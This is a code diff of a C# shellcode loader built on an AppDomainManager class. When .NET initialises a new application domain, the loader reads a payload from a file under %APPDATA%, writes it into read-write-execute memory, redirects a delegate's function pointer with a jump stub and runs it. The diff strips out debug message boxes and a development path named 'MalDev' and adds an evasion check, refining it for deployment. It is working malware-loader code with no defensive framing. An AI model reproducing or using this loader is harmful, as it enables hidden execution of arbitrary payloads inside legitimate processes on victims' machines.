@@ -12,13 +12,14 @@ using System.Linq;
 using System.Threading;
 using System.Runtime.ConstrainedExecution;
 using System.Security;
+using System.Windows.Forms;
 
 public sealed class UevApp : AppDomainManager
 {
 
     public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
     {
-        bool res = UevAppClass.Execute();
+        UevAppClass.Execute();
         return;
     }
 }
@@ -105,85 +106,36 @@ public class UevAppClass
 
     delegate void Callingdelegate();
 
-    //[DllImport("Kernel32")]
-    //public static extern uint GetCurrentThreadId();
-
-    //[DllImport("Kernel32")]
-    //public static extern int SuspendThread(IntPtr hThread);
-
-    //public enum ThreadAccess : int
+    //public static void Execute()
     //{
-    //    TERMINATE = (0x0001),
-    //    SUSPEND_RESUME = (0x0002),
-    //    GET_CONTEXT = (0x0008),
-    //    SET_CONTEXT = (0x0010),
-    //    SET_INFORMATION = (0x0020),
-    //    QUERY_INFORMATION = (0x0040),
-    //    SET_THREAD_TOKEN = (0x0080),
-    //    IMPERSONATE = (0x0100),
-    //    DIRECT_IMPERSONATION = (0x0200)
+    //    return;
     //}
-
-    //[DllImport("kernel32.dll", SetLastError = true)]
-    //static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
-
-    //[DllImport("kernel32.dll", SetLastError = true)]
-    //[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
-    //[SuppressUnmanagedCodeSecurity]
-    //[return: MarshalAs(UnmanagedType.Bool)]
-    //static extern bool CloseHandle(IntPtr hObject);
-
-    //[DllImport("kernel32.dll")]
-    //static extern uint GetLastError();
-
-    public static bool Execute()
+    public static void Execute()
     {
-        //uint currentThreadID = GetCurrentThreadId();
-        //foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
-        //{
-        //    if (thread.Id != currentThreadID)
-        //    {
-        //        IntPtr hThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
-        //        if (hThread != IntPtr.Zero)
-        //        {
-        //            if (SuspendThread(hThread) == -1)
-        //            {
-        //                var lastError = GetLastError();
-        //                System.Windows.Forms.MessageBox.Show(lastError.ToString("X8"));
-        //            }
-        //            CloseHandle(hThread);
-        //        }
-        //        else
-        //        {
-        //            var lastError = GetLastError();
-        //            System.Windows.Forms.MessageBox.Show(lastError.ToString("X8"));
-        //        }
-        //    }
-        //}
+        if (AppDomain.CurrentDomain.FriendlyName == "UevApp")
+        {
+            return;
+        }
 
-        byte[] shellcode = File.ReadAllBytes("D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\FinalTest.sc");
-        //byte[] shellcode = File.ReadAllBytes("C:\\Users\\Admin\\Downloads\\download.dat");
+        string shellcodePath = Environment.ExpandEnvironmentVariables("%APPDATA%\\CLView\\db.dat");
+        if (!File.Exists(shellcodePath))
+        {
+            return;
+        }
+
+        byte[] shellcode = File.ReadAllBytes(shellcodePath);
         IntPtr pMem = GenerateRWXMemory(shellcode.Length);
         Callback myAction = new Callback(Action);
         IntPtr pMyAction = Marshal.GetFunctionPointerForDelegate(myAction);
         var jmpCode = new byte[] { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
-
-        System.Windows.Forms.MessageBox.Show(pMem.ToString("X8"));
         CopyMemory(shellcode, pMem);
-
-        // copy jmpcode stub in delegate function pointer
         CopyMemory(jmpCode, pMyAction);
-
-        // overwrite x41 stub with IL.Emit allocated memory function pointer address
-        WriteMemory(pMyAction + 2, pMem + 0x90C20);
-        //WriteMemory(pMyAction + 2, pMem);
+        WriteMemory(pMyAction + 2, pMem + 0xA6A0);
         Callingdelegate callingdelegate = Marshal.GetDelegateForFunctionPointer<Callingdelegate>(pMyAction);
         callingdelegate();
         while (true)
         {
             Thread.Sleep(1000000);
         }
-
-        return true;
     }
 }
